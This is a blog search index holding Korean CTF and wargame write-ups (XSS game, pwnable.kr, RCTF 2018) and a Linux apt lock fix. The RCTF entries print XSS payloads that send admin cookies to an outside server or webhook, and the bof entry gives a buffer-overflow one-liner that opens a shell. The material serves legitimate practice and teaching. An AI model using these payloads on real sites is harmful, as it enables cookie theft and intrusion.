scriptEl.onerror = function() {         setInnerText(document.getElementById(\"log\"),            \"Couldn't load gadget from \" + url);      }      document.head.appendChild(scriptEl);    }    // Take the value after # and use it as the gadget filename.    function getGadgetName() {       return window.location.hash.substr(1) || \"/static/gadget.js\";    }    includeGadget(getGadgetName());    // Extra code so that we can communicate with the parent page    window.addEventListener(\"message\", function(event){      if (event.source == parent) {        includeGadget(getGadgetName());      }    }, false);    &lt;/script&gt;  &lt;/head&gt;  &lt;body id=\"level6\"&gt;    &lt;img src=\"/static/logos/level6.png\"&gt;    &lt;img id=\"cube\" src=\"/static/level6_cube.png\"&gt;    &lt;div id=\"log\"&gt;Loading gadget...&lt;/div&gt;  &lt;/body&gt;&lt;/html&gt;script 소스코드를 살펴보니 아래와 같은 매커니즘으로 동작하고 있었다.1. URL에서 # 뒤의 값을 가져와 url 변수에 저장  2. url 변수에서 https:// 형태의 값이 있는지 검사  3. 만약 https:// 형태의 값이 있을 경우, Sorry, cannot load a URL containing \"http\" 출력하고 종료  4. 필터링을 통과 할 경우 해당 url에 있는 script 코드를 그대로 load  따라서 외부의 링크에서 악성 스크립트 코드를 생성 해 # 뒤에 넘겨주면 이를 그대로 실행 해 준다.이 때 http:// 혹은 https://에는 필터링이 있으므로 외부의 악성 스크립트 코드 주소에서 해당 값은 없어야 한다.필터링을 하는 부분을 잘 살펴보면, 정규표현식의 형태로 되어있다.그런데 소문자에 대해서는 필터링이 있지만, http중 한 글자라도 대문자가 있으면 필터링에 걸리지 않는다.이에 외부의 링크에서 alert 창을 띄울 수 있는 script 코드를 구현한 후, http 대신 대문자로 HTTP를 사용 해 # 뒤에 넘겨주면 된다.먼저 alert를 띄울 수 있는 스크립트 코드를 test.js라는 이름으로 아래와 같이 구현했다.alert(1);이 후 # 뒤에 HTTP://내서버의주소/test.js를 전달 해 주었는데, 제대로 작동하지 않았다.Sorry, I can't navigate the frame to that URL 이라는 alert 창만 떴다.그래서 이 문제는 힌트를 참고하게 되었다.4번째 힌트를 보면 아래와 같은 내용이 있다.4. If you can't easily host your own evil JS file, see if google.com/jsapi?callback=foo will help you here.힌트에 따라 google.com/jsapi?callback=foo에 접속 해 보았더니 코드가 있었다.그런데 하단에 아래와 같이 foo() 함수를 호출하는데, 이때 foo는 callback의 값으로 넘어간 값이었다.이에 foo 대신 alert를 넘겨주면 소스코드의 하단에서 foo(); 대신 alert();를 호출하지 않을까 싶어 alert를 넘겨주어 보았다.예상대로 alert();를 호출하게 된다.이에 해당 URL에서 http://를 대문자로 바꾸어 문제의 # 뒤에 전달 해 주었다.http://xss-game.appspot.com/level6/frame#HTTPS://www.google.com/jsapi?callback=alert그 결과 드디어 마지막 문제를 풀 수 있었다.이렇게 6단계의 문제를 모두 풀 수 있었다.마지막 문제에서 어떤 부분 때문인지 , 이론상으론 될 것 같은데 문제가 풀리지 않아 오래 고민을 했다.그런데 문제를 다 푼 다음에 도대체 왜 안되는지를 모르겠어서, 처음에 시도한 방법을 다시 해 보았더니 이번엔 문제가 풀렸다.http://xss-game.appspot.com/level6/frame#HTTP://내서버의주소/test.js기준이 따로 있는건지 뭔지 모르겠다.어찌됬든 6문제 모두 CLEAR!",
        "url": "//wargame/xss%20game/2018/06/27/xssgame-writeup.html"
      }
      ,
    
      "wargame-pwnable-kr-2018-05-30-pwnable-kr-mistake-html": {
        "title": "[Pwnable.kr] Toddler's Bottle - mistake 문제풀이",
        "tags": "Write-up, Pwnable.kr",
        "date": "May 30, 2018",
        "author": "",
        "category": "",
        "content": "어제에 이어 오늘도 문제를 풀었다.무슨 문제를 풀까 고민하다가 mistake 문제가 1pt라 쉬울 것 같아서 먼저 풀어보게 되었다.문제 접속 정보는 아래와 같다.  ssh mistake@pwnable.kr -p2222 (pw:guest)또한 힌트로 hint : operator priority가 나와있다.연산자 우선순위에 관련 된 문제인 것 같다.이번에는 문제에 접속하니 4개의 파일을 확인할 수 있었다.  -r——–  1 mistake_pwn root      51 Jul 29  2014 flag-r-sr-x—  1 mistake_pwn mistake 8934 Aug  1  2014 mistake-rw-r–r–  1 root        root     792 Aug  1  2014 mistake.c-r——–  1 mistake_pwn root      10 Jul 29  2014 password먼저 mistake.c 소스코드를 확인 해 보니 아래와 같았다.#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len){\tint i;\tfor(i=0; i&lt;len; i++){\t\ts[i] ^= XORKEY;\t}}int main(int argc, char* argv[]){\t\tint fd;\tif(fd=open(\"/home/mistake/password\",O_RDONLY,0400) &lt; 0){\t\tprintf(\"can't open password %d\\n\", fd);\t\treturn 0;\t}\tprintf(\"do not bruteforce...\\n\");\tsleep(time(0)%20);\tchar pw_buf[PW_LEN+1];\tint len;\tif(!(len=read(fd,pw_buf,PW_LEN) &gt; 0)){\t\tprintf(\"read error\\n\");\t\tclose(fd);\t\treturn 0;\t\t\t}\tchar pw_buf2[PW_LEN+1];\tprintf(\"input password : \");\tscanf(\"%10s\", pw_buf2);\t// xor your input\txor(pw_buf2, 10);\tif(!strncmp(pw_buf, pw_buf2, PW_LEN)){\t\tprintf(\"Password OK\\n\");\t\tsystem(\"/bin/cat flag\\n\");\t}\telse{\t\tprintf(\"Wrong Password\\n\");\t}\tclose(fd);\treturn 0;}언뜻 보면 password 파일을 open() 함수를 통해 열어 read() 함수로 읽은 후, 해당 값과 사용자가 입력 한 값을 xor 연산한 값이 같을 경우 flag를 출력 해 주는 것 같다.그런데 자세히 보면 open() 함수와 read() 함수를 호출하는 if의 조건 안에서 괄호가 없다.if(fd=open(\"/home/mistake/password\",O_RDONLY,0400) &lt; 0)if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))정상적으로 동작하기 위해서는 fd=(\"/home/mistake/password\",O_RDONLY,0400)가 먼저 수행된 후, &lt; 연산자로 0과 비교해야 한다.read() 함수 또한 len=read(fd,pw_buf,PW_LEN)가 먼저 수행된 후, &gt;를 통해 0과 비교해야 한다.하지만 MSDN의 연산자 우선 순위를 살펴보면 &lt; 혹은 &gt;이 = 보다 우선 순위가 높다는 것을 알 수 있다.때문에 원래의 의도와는 달리 open(\"/home/mistake/password\",O_RDONLY,0400) &lt; 0가 먼저 수행된 후에 이 결과가 fd에 저장된다.따라서 부등호를 통한 연산 결과에 따라 fd 혹은 len에 어떠한 값이 저장 될 것이다.어떤 값이 저장되는지 확인하기 위해 아래와 같이 코드를 구현 해 테스트 해 보았다.#include &lt;stdio.h&gt;int main() {        int a = 2 &lt; 3;        int b = 3 &lt; 2;        printf(\"%d\\n\", a);        printf(\"%d\\n\", b);}그 결과, a는 1이, b는 0이 출력되었다.즉, 부등호를 통한 연산 결과가 참일경우 1이, 거짓일 경우에는 0이 저장되는 것이다.다시 문제로 돌아가서, open(\"/home/mistake/password\",O_RDONLY,0400) &lt; 0에서 open() 함수가 정상적으로 파일을 열었다면, 양의 정수인 파일 디스크립터를 반환 해 준다.이 때, open() 함수의 결과(양의 정수) &lt; 0은 거짓이 되므로, 결과적으로 fd에는 0이 저장된다.이 후, read(fd,pw_buf,PW_LEN)에서 pw_buf에 PW_LEN의 길이만큼 저장하는데, 읽어 오는 파일 디스크립터는 fd, 즉 0이 된다.그런데 0은 파일 디스크립터 중 표준 입력이므로, 사용자가 입력 한 값을 읽어 pw_buf에 저장하게 된다.따라서 문제를 풀기 위해서는 do not bruteforce...가 출력된 후 사용자가 원하는 특정 값을 10자리 입력하고, 각 자리를 XORKEY와 xor 연산한 값을 input password :  다음에 입력 해 주면 될 것이다.XORKEY는 소스코드 상단에 1이라고 선언되어 있다.따라서 나는 문제를 풀기 위해 do not bruteforce... 다음에는 bbbbbbbbbb을, input password :  다음에는 bbbbbbbbbb과 1을 xor 연산 한 cccccccccc를 입력 해 주었다.mistake@ubuntu:~$ ./mistake do not bruteforce...bbbbbbbbbbinput password : ccccccccccPassword OKMommy, the operator priority always confuses me :(FLAG : Mommy, the operator priority always confuses me :(",
        "url": "//wargame/pwnable.kr/2018/05/30/pwnable.kr-mistake.html"
      }
      ,
    
      "wargame-pwnable-kr-2018-05-29-pwnable-kr-random-html": {
        "title": "[Pwnable.kr] Toddler's Bottle - random 문제풀이",
        "tags": "Write-up, Pwnable.kr",
        "date": "May 29, 2018",
        "author": "",
        "category": "",
        "content": "그동안 바빠서 문제를 못풀다가 오랜만에 Pwnable.kr에 접속 해 문제를 풀어보았다.passcode를 풀어보려다가 random 문제가 더 쉬워서 먼저 풀게 되었다.문제 접속 정보는 아래와 같다.  ssh random@pwnable.kr -p2222 (pw:guest)문제에 접속하면 다른 문제들과 동일하게 3개의 파일을 확인할 수 있다.  -r–r—–  1 random_pwn root     49 Jun 30  2014 flag-r-sr-x—  1 random_pwn random 8538 Jun 30  2014 random-rw-r–r–  1 root       root    301 Jun 30  2014 random.c먼저 random.c 소스코드를 확인 해 보니 아래와 같았다.#include &lt;stdio.h&gt;int main(){\tunsigned int random;\trandom = rand();\t// random value!\tunsigned int key=0;\tscanf(\"%d\", &amp;key);\tif( (key ^ random) == 0xdeadbeef ){\t\tprintf(\"Good!\\n\");\t\tsystem(\"/bin/cat flag\");\t\treturn 0;\t}\tprintf(\"Wrong, maybe you should try 2^32 cases.\\n\");\treturn 0;}rand() 함수를 통해 random 값을 생성하고, 이 값과 User가 입력 한 key 값을 XOR 한 값이 0xdeadbeef라면 flag를 읽을 수 있다.이 때, rand() 함수에 아무런 seed 값이 들어있지 않다.  seed란          난수 생성 시 인자로 주어, 항상 다른값이 나올 수 있도록 해 주는 값      만약 이 seed 값이 없거나 항상 같은 값이라면 rand() 함수 등을 통해 생성되는 난수 값은 규칙적임      즉, seed 값이 없기 때문에 rand() 함수에서 생성되는 난수의 값은 항상 규칙적일 것이다.이를 확인 해 보기 위해 아래와 같이 코드를 구현하였다.#include &lt;stdio.h&gt;int main() {\tint i;\tfor(i = 0; i &lt; 5; i ++) {\t\tunsigned int value= rand();\t\tprintf(\"%d : %d\\n\", i, value);\t}}그 결과 아래와 같이 실행할 때마다 같은 난수 값이 출력되는 것을 확인할 수 있었다.그렇다면, 서버에서 실행되고 있는 random에서, rand() 함수를 통해 생성되는 난수 값 또한 같을 것이다.우리가 필요한 것은 우리가 입력한 값과 rand() 함수를 XOR 한 값이 0xdeadbeef여야 한다는 것이다.그런데 XOR의 경우 아래와 같은 특징이 있다.A XOR B = C 라면 B XOR C = A 이고, C XOR A = B 이다.문제에서 key ^ random = 0xdeadbeef를 만족하는 key를 찾아야 하므로, random ^ 0xdeadbeef를 한다면 key 값을 찾을 수 있게 된다.rand() 함수에서 첫 번째로 나오는 값과 0xdeadbeef를 XOR 해 보면 아래와 같은 값이 나온다.&gt;&gt;&gt; 1804289383 ^ 0xdeadbeef3039230856문제 서버에서 random을 실행시킨 후 결과로 나온 3039230856를 입력하면 flag를 얻을 수 있다.random@ubuntu:~$ ./random3039230856Good!Mommy, I thought libc random is unpredictable...FLAG : Mommy, I thought libc random is unpredictable...",
        "url": "//wargame/pwnable.kr/2018/05/29/pwnable.kr-random.html"
      }
      ,
    
      "ctf-2018-2018-05-27-ctf-rctf2018-rblog-html": {
        "title": "[RCTF2018] rblog Write up",
        "tags": "Write-up, CTF, RCTF2018",
        "date": "May 27, 2018",
        "author": "",
        "category": "",
        "content": "rblog는 RCTF 2018에 출제되었던 XSS 문제인데, 대회 기간에는 풀이하지 못했다가 Write-up이 올라온 후 풀어보게 되었다.문제 정보는 아래와 같다.get `document.cookie`http://rblog.2018.teamrois.cn1. 문제 분석문제 링크에 접속하면 아래와 같은 페이지를 확인할 수 있다.제목과 내용을 적고, 스타일을 적용하거나 이미지를 업로드할 수 있는 기능이 있다.또한 최신 버전의 Chrome을 사용중인 admin에게 신고할 수도 있다.admin에게 신고할 때에는 특정 값을 입력해야 하는데, 이는 내가 업로드 한 블로그의 주소라는 것을 알 수 있다.2. 취약점 찾기문제의 설명에서 document.cookie를 얻으라고 했으므로 XSS 문제인 것은 알 수 있다.때문에 어떤 부분에서 XSS가 가능한지 알기 위해 title, content, style을 적용하는 부분에 아래와 같이 script 코드를 삽입 해 보았다.그 결과, title 부분에서 script가 정상적으로 삽입되는 것을 확인할 수 있었지만, 실행되지는 않았다.이 문제에도 역시나 CSP가 걸려있었다.XSS 공격은 해야하는데, CSP가 걸려 있어서 어떻게 풀이해야 하나 싶었는데, 다른 사람들의 write-up을 보니 Google에서 만든 CSP Evaluator를 통해 특정 사이트에 적용 된 CSP 정보를 확인할 수 있었다.문제의 URL을 넣고 확인 해 보니 base-uri에 대한 보호가 적용되어 있지 않았다.즉, &lt;base&gt;라는 태그를 사용하여 소스코드 상에서 사용된 상대 경로의 기준이 될 경로를 지정할 수 있다.만약 소스코드에서 css 파일이나 js 파일 등을 참조할 때 ./css/style.css라는 상대 경로가 있을 경우, &lt;base&gt; 태그를 이용해 따로 경로를 설정해 주지 않는 한 현재 페이지의 경로를 기준으로 style.css를 찾아간다.그런데 만약 &lt;base&gt; 태그를 이용 해 &lt;base href=\"http://www.test.com/\"&gt;와 같이 기준 경로를 바꾸어 줄 경우, 설정해 준 경로를 기준으로 파일을 찾아가게 된다.따라서 &lt;base&gt; 태그를 이용 해 기준 경로를 바꾸어 준다면, 문제의 소스코드 내에서 사용하는 js나 css를 내가 원하는 파일로 바꾸어 실행시킬 수 있다.우리는 document.cookie를 얻어야 하므로, js 파일을 사용하는 부분을 찾아보았다.다시 소스코드를 살펴보니 내가 업로드 한 블로그 글의 하단에서 아래와 같이 js 파일을 실행시키는 것을 확인할 수 있었다.따라서 &lt;base&gt; 태그를 이용 해 기준 경로를 바꾸어 준 후, 바꾼 경로에 /assets/js/jquery.min.js 파일을 만든다면, 내가 원하는 코드를 실행시킬 수 있게 된다.3. 문제 풀이나는 내 서버와 도메인을 갖고 있기 때문에 내 서버를 사용했다.내 서버에 /assets/js/ 디렉토리 아래에 jquery.min.js 파일을 생성한 후, 아래와 같이 소스코드를 구현하였다.location.href = \"http://ccoma.me/?\" + document.cookie;이 후 title에 &lt;base href=\"http://ccoma.me/\"/&gt; 를 넣어 글을 올린다면 기준 경로가 내 도메인이 되어 &lt;script nonce=\"af8d8b049007ffdddf9d4104295d126e\" src=\"/assets/js/jquery.min.js\"&gt;&lt;/script&gt;는 실제로는 http://ccoma.me/assets/js/jquery.min/js를 실행하게 된다.이 때, 해당 경로에는 location.href = \"http://ccoma.me/?\" + document.cookie;가 있으므로 document.cookie의 값을 인자로 해 해당 도메인에 접근하게 될 것이다.글을 업로드 한 후에 해당 글의 경로를 admin에게 신고하면 admin이 해당 글에 접근할 것이며, 결론적으로 admin의 cookie를 인자로 해당 도메인에 다시 접근하게 된다.먼저 아래와 같이 글을 올려 보았다.jquery.min.js에는 location.href가 구현되어 있기 때문에 내 서버로 리다이렉트 될 것이다.때문에 burp suite를 이용 해 Response를 잡아 블로그 글의 주소를 캡쳐 했다.이 후 해당 글의 링크를 admin에게 보내주었다.그러면 admin이 내 서버로 접근하게 되는데, 이 때 GET 방식으로 cookie가 넘어오게 되므로 이를 확인하기 위해 access.log를 확인 해 보았다.tail -f /var/log/apache2/access.log전송 후에 짧게는 몇 초, 길게는 2분 정도를 기다리면 아래와 같이 flag가 함께 전송된 것을 확인할 수 있다.FLAG : RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012}",
        "url": "//ctf/2018/2018/05/27/ctf-rctf2018-rblog.html"
      }
      ,
    
      "ctf-2018-2018-05-23-ctf-rctf2018-amp-html": {
        "title": "[RCTF2018] amp Write up",
        "tags": "Write-up, CTF, RCTF2018",
        "date": "May 23, 2018",
        "author": "",
        "category": "",
        "content": "2018년 5월 19일부터 5월 21일까지 RCTF가 있었다.비록 대회 도중에는 문제를 못풀었지만, 대회 종료 후 amp 문제를 풀게되어 Write-up을 작성하게 되었다.문제 링크에 접속하면 아래와 같은 페이지를 확인할 수 있다.쿠키를 확인 해 보니, FLAG 라는 이름으로 flag_is_in_admin_cookie 값이 있었다.입력 값을 줄 수 있는 곳이 없어 헤메던 중, 메인 페이지에 HEY INPUT YOUR NAME AFTER QUERYSTRING이 적혀있는 것을 발견했다.QUERYSTRING은 GET 방식으로 인자를 넘길 때 index.php?id=aaa와 같은 형태를 의미한다.NAME을 입력하라고 했으므로, 문제의 url 뒤에 name=ccoma를 입력 해 보았다.그랬더니 그림과 같이, name 값이 그대로 출력되는 것을 확인할 수 있었다.내가 입력한 값이 그대로 출력 된다는 점에서 XSS 공격을 생각했지만, 분명히 script는 들어가는데 동작하지는 않았다.curl -v 명령어를 통해 확인 해 보니, CSP(Content Security Policy)가 걸려 있었다.실제 CTF 대회 기간에는 이정도밖에 알아내지 못해서 문제를 풀지 못했었다.(흑 ㅠㅠ)그래서 대회 종료 후, Write-up이 올라오기만을 기다리다가 ctftime.org에 풀이가 올라온 후 문제를 다시 풀어보았다.내가 간과한 점은, 바로 주석이었다.페이지 소스를 보면 HTML 주석으로 다음과 같은 글이 있다.&lt;!-- OK, I don't care AMP Standard --&gt;&lt;!-- It just wastes my time. --&gt;대회 기간에는 주의깊게 살펴보지 않아 무슨 내용인지 몰랐지만, Write-up을 보고 다시 살펴보니 AMP 표준에 대해서는 신경쓰지 않는다는 내용이었다.AMP 표준은 아래 링크에서 확인할 수 있다.AMP 표준 확인AMP(Accelerated Mobile Pages)란, Google에서 시작한 프로젝트로 모바일 전용 빠른 웹 페이지를 의미한다.모바일 시장에서 페이지 로딩 속도는 이탈률을 막는 매우 중요한 요소라고 한다.그런데 우리가 일반적으로 사용하는 웹 페이지는 모바일에서 성능 저하가 나타나기 때문에 Google에서는 AMP를 만들어 이를 보완하고자 했다.하지만 Google은 모바일에서 웹 페이지의 성능을 보장하기 위해 몇 가지 제약 사항을 주었다.  CSS는 모두 inline으로 해야하며 50KB를 넘을 수 없다.  script는 &lt;script async src=\"https://cdn.ampproject.org/v0.js\"&gt;&lt;/script&gt; 처럼 AMP에서 제공하는 것 말고 외부 스크립트는 허용하지 않는다.  &lt;amp-img&gt;, &lt;amp-video&gt; 처럼 AMP 전용 태그를 사용해야 한다.이 외에도 다양한 제약사항이 있지만, 이번에 출제 된 문제를 풀기 위해서는 이정도만 알고 있어도 충분할 것 같다.AMP 라는 힌트를 얻었으므로, AMP 표준을 둘러보았다.내가 문제를 풀기 위해 필요한 것은 admin의 flag 이기 때문에, 무언가 쿠키 값을 가져올 수 있는 태그가 필요했다.태그를 찾던 중, &lt;amp-pixel&gt; 태그를 보게 되었다.&lt;amp-pixel&gt; 태그는 페이지 뷰를 카운트 할 때 유용한 태그라고 한다.&lt;amp-pixel&gt; 태그에는 기본적으로 url을 속성으로 주어야 하는데, 만약 해당 코드가 있는 페이지를 누군가 접근한다면, 태그 안에 적혀있는 url로 GET request를 전송 해 준다.그런데 이 태그의 속성으로 CLIENT_ID라는 것을 사용할 수 있다.CLIENT_ID는 사용자를 식별하기 위한 속성으로, AMP 문서가 Google AMP 캐시를 통해 제공되지 않을 경우에는 쿠키로 대체된다.즉, 쿠키 값에 접근할 수 있다.따라서 문제를 풀기 위해 &lt;amp-pixel&gt; 태그를 사용하고, url에는 내가 GET request를 받아서 확인할 수 있는 주소로 주고, CLIENT_ID를 사용 해 쿠키 값을 함께 전송하도록 하면 된다.그런데 내가 필요한 것은 나의 쿠키가 아니라 admin의 쿠키값이다.이를 위해 있는 기능이 name을 전송한 뒤에 볼 수 있는 STOP TRACKING ME 버튼이다.이 버튼을 누를 경우, We logged your request and contacted admin이라고 출력된다.즉, admin이 내가 name의 인자로 준 XSS 코드를 실행시킬 수 있다.이제 필요한 것은, 내가 GET request를 확인할 수 있는 링크이다.&lt;amp-pixel&gt;은 https만을 지원하는데, 내 서버에는 https 서버가 구축되어 있지 않다.python으로 https 서버를 구축 해 봤지만, 제대로된 인증서를 사용하지 않아서인지 응답을 정확히 받아오지 못했다.그래서 https://webhook.site 를 사용했다.해당 사이트에서 URL을 받은 후, 문제에서 name 옆에 아래와 같이 입력 해 주었다.&lt;amp-pixel src=\"https://webhook.site/ee162cc6-d050-482e-89b5-9efd05074455?url=CLIENT_ID(FLAG)\"&gt;&lt;/amp-pixel&gt;그 결과 위와 같이 코드가 삽입된 것을 확인할 수 있었다.https://webhook.site로 돌아가 확인 해 보니 아래와 같이 내가 보낸 요청이 온 것을 확인할 수 있었다.이에, STOP TRACKING ME 버튼을 누른 후, 요청을 다시 확인 해 보았다.드디어 플래그를 얻을 수 있었다!FLAG : RCTF{El_PsY_CONGRO0_sg0}Plaid CTF, DEFCON에 이어 RCTF까지 문제 내에 힌트가 있음에도 이를 주의깊게 확인하지 않았던 문제들이 많아 너무 아쉬웠다.이번 대회에서는 대회 기간동안에 문제를 풀지 못했지만, 다음 대회에서는 좀 더 주의깊게 확인 해 꼭 대회 기간 내에 문제를 풀어보고 싶다.",
        "url": "//ctf/2018/2018/05/23/ctf-rctf2018-amp.html"
      }
      ,
    
      "error-linux-2018-04-23-linux-dpkg-error-html": {
        "title": "[Linux 오류] Could not get lock 오류",
        "tags": "Error, Linux",
        "date": "April 23, 2018",
        "author": "",
        "category": "",
        "content": "Ubuntu에서 apt-get을 사용하다보면 아래의 오류를 자주 볼 수 있다.요즘들어 특히 자주보여 블로그에 정리하려 한다.E: Could not get lock /var/lib/dpkg/lock - open (11: Resource temporarily unavailable)E: Unable to lock the administration directory (/var/lib/dpkg/), is another process using it?아래의 2가지 방법 중 하나를 사용하면 거의 해결된다.  lock 삭제rm -rf /var/lib/dpkg/lock  clear cacheapt-get autoclean $$ apt-get clear cache  lock 삭제 후 apt update    rm /var/lib/apt/lists/lockrm /var/cache/apt/archives/lockrm /var/lib/dpkg/lock*sudo dpkg --configure 0aapt update      ",
        "url": "//error/linux/2018/04/23/linux-dpkg_error.html"
      }
      ,
    
      "wargame-pwnable-kr-2018-02-21-pwnable-kr-flag-html": {
        "title": "[Pwnable.kr] Toddler's Bottle - flag 문제풀이",
        "tags": "Write-up, Pwnable.kr",
        "date": "February 21, 2018",
        "author": "",
        "category": "",
        "content": "이번에는 Pwnable.kr 의 flag 문제를 풀어 보았다.flag 문제는 pwnable 문제가 아니라 reversing 문제이다.문제를 클릭하면 아래와 같이 다운로드 받을 수 있는 링크와 reversing 문제라는 설명이 나온다.  http://pwnable.kr/bin/flag문제를 다운받아 파일의 정보를 확인 해 보았다.64 비트 elf 파일임을 확인할 수 있다.파일을 실행 해 보았더니 아래와 같은 문자열을 확인할 수 있었다.파일을 분석하기 위해 IDA를 통해 열어보았다.그런데 파일을 열어보았더니 함수는 3개밖에 없고 분석할 수가 없다.파일을 실행했을 때 출력되는 I will malloc() and strcpy the flag there. take it. 문자열을 찾기 위해 바이너리의 문자열들을 확인 해 보았다.문자열을 확인 해 보았더니, I will malloc() and strcpy the flag there. take it.는 없지만, 아래와 같이 upx 관련 문자열을 찾을 수 있었다.아무래도 upx 패킹 된 파일인 것 같아 upx 언패킹을 해 보았다.정상적으로 언패킹 되었다.언패킹 된 파일을 다시 IDA를 통해 열어 보았다.main 함수를 확인해 본 결과 위와 같은 코드를 볼 수 있었다.파일을 실행했을 때 확인할 수 있는 문자열을 puts 함수를 통해 출력하고, malloc를 통해 100 byte를 할당한 후, strcpy 함수를 통해 flag의 내용을 해당 위치에 복사한다.이에 flag의 내용을 확인 해 보았다.위와 같이 바로 flag 의 값을 확인할 수 있었다.FLAG : UPX...? sounds like a delivery service :)",
        "url": "//wargame/pwnable.kr/2018/02/21/pwnable.kr-flag.html"
      }
      ,
    
      "wargame-pwnable-kr-2018-02-19-pwnable-kr-bof-html": {
        "title": "[Pwnable.kr] Toddler's Bottle - bof 문제풀이",
        "tags": "Write-up, Pwnable.kr",
        "date": "February 19, 2018",
        "author": "",
        "category": "",
        "content": "Pwnable.kr 문제에서 3번째 문제인 bof 문제를 풀어보았다.이번 문제는 로컬 문제가 아니라 리모트로 접속 해 풀어야 하는 문제이다.때문에 bof 문제에서는 bof 실행파일과 bof.c라는 소스코드를 다운로드 할 수 있는 링크와 리모트로 접속할 수 있는 정보를 제공해준다.  http://pwnable.kr/bin/bof  http://pwnable.kr/bin/bof.c  nc pwnable.kr 9000bof.c의 소스코드를 확인해 보면 아래와 같다.#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key){\tchar overflowme[32];\tprintf(\"overflow me : \");\tgets(overflowme);\t// smash me!\tif(key == 0xcafebabe){\t\tsystem(\"/bin/sh\");\t}\telse{\t\tprintf(\"Nah..\\n\");\t}}int main(int argc, char* argv[]){\tfunc(0xdeadbeef);\treturn 0;}main 함수에서는 0xdeadbeef를 인자로 해 func 함수를 호출한다.func 함수에서는 먼저 32 byte 의 char 형 변수인 overflowme를 선언하고, 해당 변수에 gets 함수를 통해 입력을 받아 저장한다.  gets 함수          함수 원형 : gets(char * str)      표준 입력에서 문자열을 가져온다.      이 때, 개행 문자(\\n)이나 파일 끝(EOF)를 만나기 전까지 가져오는데, 크기를 따로 검사하지 않기 때문에 overflow 가 일어날 수 있다.      이 후, 만약 func 함수에 인자로 넘어 온 key의 값이 0xcafebabe와 같다면 system 함수를 통해 /bin/sh를 실행시켜 준다.func 함수에서 gets 함수를 통해 문자열을 입력 받는데, 문자열의 길이를 검사하지 않는다.때문에 overflow를 발생시킬 수 있다.위의 그림은 func 함수를 호출했을 때의 stack 모습니다.func 함수를 호출하면 스택에는 func 함수의 인자인 key(0xdeadbeef) 스택에 저장하고, return address와 SFP를 차례로 스택에 저장한 후, func 함수에서 사용 할 지역 변수인 overflowme를 위한 공간을 할당한다.이 때, overflowme는 32 byte의 공간을 할당받았지만 gets 함수에서 문자열의 길이를 확인하지 않아 아래와 같이 overflow가 발생할 수 있다.overflowmw에 충분한 값을 입력한 후, func 함수의 인자인 key의 값이 저장된 위치에 0xcafebabe를 덮어 쓴다면 system(\"/bin/sh\")가 실행되며 쉘을 얻을 수 있다.문제를 풀기 위해선 overflowme와 key 사이의 거리를 알아야 한다.이를 알기 위해 gdb를 사용했다.먼저 key의 값을 비교하는 부분인 0x56555654 &lt;+40&gt;에 break point를 걸고 32 byte 만큼을 입력 해 보았다.실행 후 확인해 본 결과 아래와 같았다.0xffffd5cc 부터 overflowme가 시작되며, 0xffffd600 위치에 key의 값인 0xdeadbeef가 저장되어 있는 것을 알 수 있다.두 변수 간의 거리는 다음과 같다.  0xffffd600 - 0xffffd5cc = 0x34 (= 52)즉, 두 변수는 52 byte 만큼 떨어져 있다.따라서 쉘을 얻기 위해서는 52 byte 만큼의 값을 입력하고, 이 후 0xcafebabe를 입력 해 주면 overflow가 발생하며 func의 인자인 key의 값을 덮어쓸 수 있을 것이다.이를 실행해본 결과 다음과 같이 쉘을 얻을 수 있었다.파일을 확인해 본 결과 flag 파일이 있어, 이를 실행했더니 flag를 얻을 수 있었다.ccoma@vultr:~$ (python -c 'print \"a\"*52+\"\\xbe\\xba\\xfe\\xca\"';cat) | nc pwnable.kr 9000lsbofbof.cflagloglog2super.plcat flagdaddy, I just pwned a buFFer :)FLAG : daddy, I just pwned a buFFer :)",
        "url": "//wargame/pwnable.kr/2018/02/19/pwnable.kr-bof.html"
      }
      ,
    
      "wargame-pwnable-kr-2018-02-17-pwnable-kr-col-html": {
        "title": "[Pwnable.kr] Toddler's Bottle - col 문제풀이",
        "tags": "Write-up, Pwnable.kr",
        "date": "February 17, 2018",
        "author": "",
        "category": "",
        "content": "Pwnable.kr 문제에서 2번째 문제인 colliion 문제를 풀어보았다.문제 접속 정보는 아래와 같다.  ssh col@pwnable.kr -p2222 (pw:guest)문제에 접속하면 3개의 파일을 확인할 수 있다.  -r-sr-x—  1 col_pwn col     7341 Jun 11  2014 col-rw-r–r–  1 root    root     555 Jun 12  2014 col.c-r–r—–  1 col_pwn col_pwn   52 Jun 11  2014 flagcol 라는 이름의 실행파일, col.c 라는 소스코드 파일, flag 파일이 있다.이번 문제도 역시 col 실행 파일에 SetUID가 걸려 있다.col.c 파일의 내용을 읽어 보면 다음과 같다.#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p){\tint* ip = (int*)p;\tint i;\tint res=0;\tfor(i=0; i&lt;5; i++){\t\tres += ip[i];\t}\treturn res;}int main(int argc, char* argv[]){\tif(argc&lt;2){\t\tprintf(\"usage : %s [passcode]\\n\", argv[0]);\t\treturn 0;\t}\tif(strlen(argv[1]) != 20){\t\tprintf(\"passcode length should be 20 bytes\\n\");\t\treturn 0;\t}\tif(hashcode == check_password( argv[1] )){\t\tsystem(\"/bin/cat flag\");\t\treturn 0;\t}\telse\t\tprintf(\"wrong passcode.\\n\");\treturn 0;}먼저 main 함수를 살펴 보면 다음과 같다.int main(int argc, char* argv[]){\tif(argc&lt;2){\t\tprintf(\"usage : %s [passcode]\\n\", argv[0]);\t\treturn 0;\t}\tif(strlen(argv[1]) != 20){\t\tprintf(\"passcode length should be 20 bytes\\n\");\t\treturn 0;\t}\tif(hashcode == check_password( argv[1] )){\t\tsystem(\"/bin/cat flag\");\t\treturn 0;\t}\telse\t\tprintf(\"wrong passcode.\\n\");\treturn 0;}프로그램 실행 시 argc가 2개 이하일 경우에는 usage : %s [passcode]\\n를 출력하고 프로그램을 종료한다.또한 argv[1]의 길이는 20 byte 여야 한다.만약 전역변수로 선언 한 hashcode의 값, 즉, 0x21DD09EC와 20 byte 길이의 argv[1]을 인자로 하여 check_password를 수행한 결과가 같다면 flag를 읽을 수 있다.check_password 함수는 아래와 같다.unsigned long check_password(const char* p){\tint* ip = (int*)p;\tint i;\tint res=0;\tfor(i=0; i&lt;5; i++){\t\tres += ip[i];\t}\treturn res;}p라는 변수를 인자로 받아 이를 int 형으로 타입을 캐스팅 해 준다.그런데 이때 int 형인 